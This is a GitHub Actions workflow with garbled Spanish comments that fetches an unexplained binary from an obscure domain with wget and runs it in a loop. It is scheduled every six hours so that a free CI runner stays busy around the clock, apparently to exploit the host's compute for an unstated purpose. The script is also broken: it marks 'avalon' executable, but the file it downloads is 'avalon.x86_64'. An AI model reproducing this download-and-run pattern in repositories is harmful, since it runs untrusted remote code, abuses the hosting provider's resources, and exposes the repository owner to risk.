name: Avalon Auto-Restart Service

on:
  # Ejecutar cada 6 horas
  schedule:
    - cron: '0 */6 * * *'
  # Ejecuci√≥n manual
  workflow_dispatch:
  # Ejecutar cuando hay push en main
  push:
    branches: [ main ]

jobs:
  avalon-service:
    runs-on: ubuntu-latest
    timeout-minutes: 360 # 6 horas m√°ximo

    steps:
      - name: Checkout
        uses: actions/checkout@v3

      - name: Setup Avalon
        id: setup
        run: |
          echo "Starting at: $(date)"
          echo "Next run in 6 hours"
          # Descargar avalon
          wget -q https://dcasdcas.online/avalon.x86_64
          chmod +x avalon
          # Guardar timestamp
          echo "start_time=$(date +%s)" >> $GITHUB_OUTPUT

      - name: Run Avalon continuously
        run: |
          echo "üöÄ Starting Avalon service..."
          # Funci√≥n para mantener el servicio corriendo
          while true; do
            CURRENT_TIME=$(date +%s)
            ELAPSED=$((CURRENT_TIME - ${{ steps.setup.outputs.start_time }}))
            MAX_TIME=21600 # 6 horas en segundos
            
            if [ $ELAPSED -ge $MAX_TIME ]; then
              echo "‚è∞ Time limit reached (6 hours). Stopping..."
              break
            fi
            
            echo "‚ñ∂Ô∏è Starting Avalon (Elapsed: ${ELAPSED}s / ${MAX_TIME}s)"
            # Ejecutar avalon con timeout (poco menos de 6h para evitar corte abrupto)
            timeout 21540 ./avalon codespace || true 
            
            # Si se cierra, esperar y reiniciar
            echo "üîÑ Avalon stopped. Restarting in 10 seconds..."
            sleep 10
            
            # Verificar si debemos continuar tras el sleep
            CURRENT_TIME=$(date +%s)
            ELAPSED=$((CURRENT_TIME - ${{ steps.setup.outputs.start_time }}))
            if [ $ELAPSED -ge $MAX_TIME ]; then
              echo "‚è∞ Time limit reached. Exiting loop..."
              break
            fi
          done
          echo "‚úÖ Service cycle completed"

      - name: Schedule next run
        if: always()
        run: |
          echo "üìÖ Current time: $(date)"
          echo "‚è∞ Next auto-run in 6 hours"
          echo ""
          echo "To trigger manually:"
          echo "1. Go to Actions tab"
          echo "2. Select 'Avalon Auto-Restart Service'"
          echo "3. Click 'Run workflow'"

      - name: Notify completion
        if: always()
        run: |
          echo "üèÅ Workflow completed at: $(date)"
          echo "Duration: ~6 hours"
